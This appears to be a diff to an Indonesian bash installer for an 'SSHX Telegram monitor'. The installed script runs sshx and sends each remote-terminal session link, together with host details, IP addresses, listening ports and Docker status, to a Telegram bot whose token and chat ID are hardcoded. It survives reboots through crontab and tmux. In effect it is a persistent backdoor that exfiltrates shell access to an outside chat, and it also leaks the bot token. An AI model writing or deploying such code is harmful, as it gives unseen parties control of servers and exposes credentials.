@@ -149,13 +149,14 @@ send_telegram() {
 # Fungsi Buat Script Monitor
 # ============================================
 create_monitor_script() {
-    log_step "Membuat script monitor..."
+    log_step "Membuat script monitor dengan fitur lengkap..."
     
     cat > /usr/local/bin/sshx-telegram-monitor.sh << 'EOF'
 #!/bin/bash
 
 # ============================================
 # SSHX Telegram Monitor - Core Script
+# Dengan fitur: 10 detik pertama detail, selanjutnya 1 jam
 # ============================================
 
 BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
@@ -165,7 +166,22 @@ REPORT_INTERVAL=3600  # 1 jam
 # Load OS info
 source /tmp/sshx_os_detected 2>/dev/null || echo "OS=unknown"
 
-# Fungsi kirim Telegram
+# File untuk tracking
+TEMP_DIR="/tmp/sshx-monitor"
+mkdir -p $TEMP_DIR
+COUNTER_FILE="$TEMP_DIR/counter"
+FIRST_RUN_FILE="$TEMP_DIR/first_run_done"
+LAST_LINK_FILE="$TEMP_DIR/last_link"
+LAST_REPORT_FILE="$TEMP_DIR/last_report"
+
+# Initialize counter
+if [ ! -f $COUNTER_FILE ]; then
+    echo "0" > $COUNTER_FILE
+fi
+
+# ============================================
+# Fungsi Kirim Telegram
+# ============================================
 send_telegram() {
     curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
         -d "chat_id=$CHAT_ID" \
@@ -173,103 +189,215 @@ send_telegram() {
         -d "parse_mode=HTML" > /dev/null
 }
 
-# Fungsi dapatkan info sistem lengkap
-get_system_info() {
+# ============================================
+# Fungsi Dapatkan Info Host Lengkap
+# ============================================
+get_host_info() {
     HOSTNAME=$(hostname)
-    USER=$(whoami)
-    UPTIME=$(uptime | sed 's/.*up //; s/,.*//')
-    IP_PUBLIC=$(curl -s ifconfig.me || echo "Unknown")
-    IP_LOCAL=$(hostname -I | awk '{print $1}')
+    DOMAIN=$(hostname -d 2>/dev/null || echo "none")
+    UNAME=$(uname -a)
+    KERNEL=$(uname -r)
+    OS_RELEASE=$(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2 2>/dev/null || echo "Unknown")
+    
+    echo "🖥️ <b>HOST INFORMATION</b>
+━━━━━━━━━━━━━━━━━━━━━
+• Hostname: $HOSTNAME
+• Domain: $DOMAIN
+• OS: $OS_RELEASE
+• Kernel: $KERNEL
+• Uname: <code>$UNAME</code>"
+}
+
+# ============================================
+# Fungsi Dapatkan Info Sistem
+# ============================================
+get_system_info() {
     CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
     MEM_TOTAL=$(free -h | grep Mem | awk '{print $2}')
     MEM_USED=$(free -h | grep Mem | awk '{print $3}')
+    MEM_PERC=$(free | grep Mem | awk '{printf "%.1f%%", $3/$2 * 100}')
     DISK=$(df -h / | awk 'NR==2 {print $5}')
+    UPTIME=$(uptime | sed 's/.*up //; s/,.*//')
+    LOAD=$(uptime | awk -F'load average:' '{print $2}')
+    IP_PUBLIC=$(curl -s ifconfig.me || echo "Unknown")
+    IP_LOCAL=$(hostname -I | awk '{print $1}')
     DATE=$(date "+%Y-%m-%d %H:%M:%S")
+    USERS=$(who | wc -l)
+    PROCESSES=$(ps aux | wc -l)
     
-    echo "🖥️ <b>SYSTEM INFO</b>
+    echo "📊 <b>SYSTEM STATUS</b>
 ━━━━━━━━━━━━━━━━━━━━━
-• Hostname: $HOSTNAME
-• User: $USER
+• CPU Usage: $CPU%
+• Memory: $MEM_USED / $MEM_TOTAL ($MEM_PERC)
+• Disk: $DISK
 • Uptime: $UPTIME
+• Load Avg: $LOAD
+• Users: $USERS
+• Processes: $PROCESSES
 • IP Public: $IP_PUBLIC
 • IP Local: $IP_LOCAL
-• CPU Usage: $CPU%
-• Memory: $MEM_USED / $MEM_TOTAL
-• Disk Usage: $DISK
 • Waktu: $DATE"
 }
 
-# Fungsi dapatkan SSHX link
+# ============================================
+# Fungsi Dapatkan SSHX Output Detail
+# ============================================
+get_sshx_detail() {
+    local output_file="$TEMP_DIR/sshx_output_$$"
+    
+    # Jalankan sshx dan capture output lengkap dengan timeout 5 detik
+    timeout 5 sshx --quiet > "$output_file" 2>&1 &
+    SSHX_PID=$!
+    sleep 3  # Beri waktu untuk dapat output
+    
+    # Kill proses sshx
+    kill $SSHX_PID 2>/dev/null || true
+    
+    # Baca output
+    if [ -f "$output_file" ]; then
+        cat "$output_file"
+        rm -f "$output_file"
+    fi
+}
+
+# ============================================
+# Fungsi Parse SSHX Link
+# ============================================
 get_sshx_link() {
-    # Jalankan sshx dan capture URL
-    SSHX_OUTPUT=$(sshx --quiet 2>&1)
-    SSHX_URL=$(echo "$SSHX_OUTPUT" | grep -o 'https://sshx.io/s/[^ ]*' | head -1)
-    echo "$SSHX_URL"
+    sshx --quiet 2>&1 | grep -o 'https://sshx.io/s/[^ ]*' | head -1
+}
+
+# ============================================
+# Fungsi Kirim Detail 10 Detik Pertama
+# ============================================
+send_detailed_report() {
+    local sshx_output
+    local sshx_link
+    
+    log_info "Mengirim laporan detail 10 detik pertama..."
+    
+    # Dapatkan output sshx detail
+    sshx_output=$(get_sshx_detail)
+    sshx_link=$(echo "$sshx_output" | grep -o 'https://sshx.io/s/[^ ]*' | head -1)
+    
+    # Format pesan detail
+    DETAIL_MSG="🔥 <b>SSHX DETAIL REPORT (10 DETIK PERTAMA)</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+$(get_host_info)
+
+━━━━━━━━━━━━━━━━━━━━━
+🔗 <b>SSHX LINK:</b>
+<code>${sshx_link:-"Tidak didapatkan"}</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+📝 <b>SSHX OUTPUT DETAIL:</b>
+<code>${sshx_output:-"Tidak ada output"}</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+$(get_system_info)
+
+━━━━━━━━━━━━━━━━━━━━━
+✅ <b>Monitor aktif - Report normal setiap 1 jam</b>"
+    
+    send_telegram "$DETAIL_MSG"
+    
+    # Simpan link untuk referensi
+    echo "$sshx_link" > "$LAST_LINK_FILE"
+}
+
+# ============================================
+# Fungsi Kirim Report Normal (1 Jam)
+# ============================================
+send_normal_report() {
+    local current_link
+    local last_link
+    
+    current_link=$(get_sshx_link)
+    last_link=$(cat "$LAST_LINK_FILE" 2>/dev/null || echo "none")
+    
+    # Cek apakah link berubah
+    if [ -n "$current_link" ] && [ "$current_link" != "$last_link" ]; then
+        echo "$current_link" > "$LAST_LINK_FILE"
+        LINK_STATUS="🆕 <b>LINK BARU!</b> $current_link"
+    else
+        LINK_STATUS="✅ Link: $last_link"
+    fi
+    
+    # Dapatkan info tambahan
+    NETSTAT=$(ss -tulpn | grep LISTEN | head -5 | sed 's/^/  /' | tr '\n' ' ')
+    DOCKER=$(docker ps --format "table {{.Names}}\t{{.Status}}" 2>/dev/null | head -3 | sed 's/^/  /' || echo "  Docker tidak ada")
+    
+    REPORT_MSG="📊 <b>LAPORAN PERIODIK (1 JAM)</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+$(get_host_info)
+
+━━━━━━━━━━━━━━━━━━━━━
+🔗 <b>SSHX STATUS:</b>
+$LINK_STATUS
+
+━━━━━━━━━━━━━━━━━━━━━
+$(get_system_info)
+
+━━━━━━━━━━━━━━━━━━━━━
+🌐 <b>NETWORK (LISTEN PORTS):</b>
+<code>$NETSTAT</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+🐳 <b>DOCKER (jika ada):</b>
+<code>$DOCKER</code>
+
+━━━━━━━━━━━━━━━━━━━━━
+⏰ Next report: +1 jam
+🔍 Status: Normal monitoring"
+    
+    send_telegram "$REPORT_MSG"
+    date +%s > "$LAST_REPORT_FILE"
 }
 
 # ============================================
 # Main Loop
 # ============================================
-send_telegram "🚀 <b>SSHX Monitor Started</b>
-$(get_system_info)
+main_loop() {
+    local counter=0
+    local first_run=1
+    
+    # Kirim notifikasi start
+    send_telegram "🚀 <b>SSHX MONITOR DIMULAI</b>
 ━━━━━━━━━━━━━━━━━━━━━
-⏰ Report akan dikirim setiap 1 jam
-🔍 Status: Aktif"
+$(get_host_info)
+$(get_system_info | head -10)
+━━━━━━━━━━━━━━━━━━━━━
+⏰ Akan kirim detail dalam 10 detik pertama"
+    
+    while true; do
+        # CEK APAKAH 10 DETIK PERTAMA?
+        if [ $first_run -eq 1 ]; then
+            # Tunggu 10 detik untuk kumpulkan data
+            sleep 10
+            send_detailed_report
+            first_run=0
+            counter=0
+            continue
+        fi
+        
+        # REPORT NORMAL SETIAP 1 JAM
+        if [ $counter -ge 3600 ]; then
+            send_normal_report
+            counter=0
+        fi
+        
+        sleep 10
+        counter=$((counter + 10))
+    done
+}
 
-# Hitung counter untuk report pertama
-COUNTER=0
-NEEDS_REPORT=1
-LAST_LINK=""
+# Trap untuk handle exit
+trap 'send_telegram "⚠️ <b>SSHX MONITOR STOPPED</b> $(date)"' EXIT
 
-while true; do
-    # Dapatkan SSHX link baru
-    CURRENT_LINK=$(get_sshx_link)
-    
-    # Jika link berubah atau belum pernah dapat
-    if [ -n "$CURRENT_LINK" ] && [ "$CURRENT_LINK" != "$LAST_LINK" ]; then
-        LAST_LINK="$CURRENT_LINK"
-        
-        # Format pesan link baru
-        LINK_MSG="🔗 <b>SSHX SESSION AKTIF</b>
-━━━━━━━━━━━━━━━━━━━━━
-Link: <code>$CURRENT_LINK</code>
-User: $(whoami)
-Host: $(hostname)
-Time: $(date '+%H:%M:%S')
-━━━━━━━━━━━━━━━━━━━━━
-📝 <b>Perintah Tersedia:</b>
-• ls, df, ps, netstat
-• Jalankan perintah via tmux"
-        
-        send_telegram "$LINK_MSG"
-    fi
-    
-    # Report setiap 1 jam
-    if [ $COUNTER -ge $REPORT_INTERVAL ] || [ $NEEDS_REPORT -eq 1 ]; then
-        NEEDS_REPORT=0
-        COUNTER=0
-        
-        # Dapatkan status proses
-        TMUX_SESSIONS=$(tmux list-sessions 2>/dev/null | wc -l)
-        PROCESS_COUNT=$(ps aux | grep sshx | grep -v grep | wc -l)
-        
-        REPORT_MSG="📊 <b>LAPORAN PERIODIK (1 JAM)</b>
-$(get_system_info)
-━━━━━━━━━━━━━━━━━━━━━
-📡 <b>Status SSHX:</b>
-• Link Aktif: $LAST_LINK
-• Sesi Tmux: $TMUX_SESSIONS
-• Proses SSHX: $PROCESS_COUNT
-• Uptime Script: $(ps -p $$ -o etimes= | awk '{printf "%02d:%02d:%02d", $1/3600, ($1%3600)/60, $1%60}')
-━━━━━━━━━━━━━━━━━━━━━
-✅ <b>Semua Sistem Normal</b>"
-        
-        send_telegram "$REPORT_MSG"
-    fi
-    
-    sleep 10  # Cek setiap 10 detik
-    COUNTER=$((COUNTER + 10))
-done
+# Jalankan main loop
+main_loop
 EOF
 
     chmod +x /usr/local/bin/sshx-telegram-monitor.sh
@@ -292,10 +420,9 @@ setup_tmux_and_start() {
     tmux send-keys -t sshx-monitor "bash /usr/local/bin/sshx-telegram-monitor.sh" C-m
     
     log_info "Tmux session 'sshx-monitor' telah dibuat"
-    log_info "Script monitor berjalan di dalam tmux"
     
-    # Setup auto-start on boot (via crontab)
-    (crontab -l 2>/dev/null | grep -v "sshx-telegram-monitor"; echo "@reboot tmux new-session -d -s sshx-monitor 'bash /usr/local/bin/sshx-telegram-monitor.sh'") | crontab -
+    # Setup auto-start on boot
+    (crontab -l 2>/dev/null | grep -v "sshx-telegram-monitor"; echo "@reboot sleep 10 && tmux new-session -d -s sshx-monitor 'bash /usr/local/bin/sshx-telegram-monitor.sh'") | crontab -
     
     log_info "Auto-start via crontab telah ditambahkan"
 }
@@ -307,45 +434,40 @@ show_usage_info() {
     cat << EOF
 
 ${GREEN}╔════════════════════════════════════════════════════════╗
-║            INSTALASI SELESAI! 🎉                        ║
+║         INSTALASI SELESAI! 🎉                          ║
+║   FITUR: 10 DETIK DETAIL + REPORT 1 JAM                ║
 ╚════════════════════════════════════════════════════════╝${NC}
 
-${BLUE}📋 INFORMASI PENTING:${NC}
+${BLUE}📋 INFORMASI:${NC}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 • Bot Token: ${YELLOW}8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA${NC}
 • Chat ID: ${YELLOW}-1003847935504${NC}
-• Report Interval: ${YELLOW}1 Jam${NC}
+• Report: ${YELLOW}10 detik pertama (DETAIL) + setiap 1 jam${NC}
 
-${GREEN}✅ STATUS:${NC}
-• Script monitor sudah berjalan di dalam tmux
-• Akan restart otomatis jika server reboot
-• Mengirim report ke Telegram setiap 1 jam
+${GREEN}✅ YANG AKAN DITERIMA DI TELEGRAM:${NC}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1️⃣ ${YELLOW}10 DETIK PERTAMA:${NC}
+   • Host info lengkap (uname -a, OS, kernel)
+   • Output detail sshx
+   • Link SSHX
+   • System status (CPU, RAM, Disk)
+
+2️⃣ ${YELLOW}SETIAP 1 JAM:${NC}
+   • Host info
+   • Status SSHX (link aktif/tidak)
+   • System status
+   • Network ports
+   • Docker status (jika ada)
+   • Dan info lainnya
 
 ${BLUE}📌 PERINTAH PENTING:${NC}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-• ${YELLOW}Lihat output langsung:${NC}
-  tmux attach -t sshx-monitor
-  (Tekan Ctrl+B lalu D untuk keluar tanpa stop)
+• ${YELLOW}Lihat langsung:${NC} tmux attach -t sshx-monitor
+• ${YELLOW}Keluar tmux:${NC} Ctrl+B lalu D
+• ${YELLOW}Restart monitor:${NC} tmux kill-session -t sshx-monitor && tmux new-session -d -s sshx-monitor 'bash /usr/local/bin/sshx-telegram-monitor.sh'
+• ${YELLOW}Stop monitor:${NC} tmux kill-session -t sshx-monitor
 
-• ${YELLOW}Lihat log:${NC}
-  tail -f /tmp/sshx-monitor.log
-
-• ${YELLOW}Restart monitor:${NC}
-  tmux kill-session -t sshx-monitor
-  tmux new-session -d -s sshx-monitor 'bash /usr/local/bin/sshx-telegram-monitor.sh'
-
-• ${YELLOW}Stop monitor:${NC}
-  tmux kill-session -t sshx-monitor
-  crontab -e  # Hapus baris @reboot
-
-${BLUE}📱 CEK TELEGRAM:${NC}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Buka grup SSHX di Telegram, Anda akan menerima:
-1. Notifikasi start
-2. Link SSHX setiap sesi baru
-3. Report lengkap setiap 1 jam
-
-${GREEN}🎉 INSTALASI BERHASIL! Script berjalan di background.${NC}
+${GREEN}🎉 MONITOR AKTIF! CEK TELEGRAM ANDA.${NC}
 EOF
 }
 
@@ -355,7 +477,8 @@ EOF
 main() {
     clear
     echo "${BLUE}╔════════════════════════════════════════════════════════╗"
-    echo "║        SSHX TELEGRAM MONITOR - AUTO INSTALLER         ║"
+    echo "║     SSHX TELEGRAM MONITOR - DETIK + JAMAN               ║"
+    echo "║     Fitur: 10 detik detail + Report 1 jam               ║"
     echo "╚════════════════════════════════════════════════════════╝${NC}"
     echo ""
     
@@ -376,15 +499,17 @@ main() {
     
     HOSTNAME=$(hostname)
     IP=$(curl -s ifconfig.me)
+    UNAME=$(uname -a | cut -c1-50)...
     
     send_telegram "✅ <b>INSTALASI SSHX MONITOR SELESAI</b>
 ━━━━━━━━━━━━━━━━━━━━━
 • Hostname: $HOSTNAME
 • IP: $IP
+• Uname: <code>$UNAME</code>
 • Waktu: $(date)
-• Status: Aktif di tmux
 ━━━━━━━━━━━━━━━━━━━━━
-📊 Report akan dikirim setiap 1 jam"
+📊 Mode: 10 detik detail + report 1 jam
+⏰ Tunggu 10 detik untuk laporan pertama..."
     
     # Tampilkan info
     show_usage_info
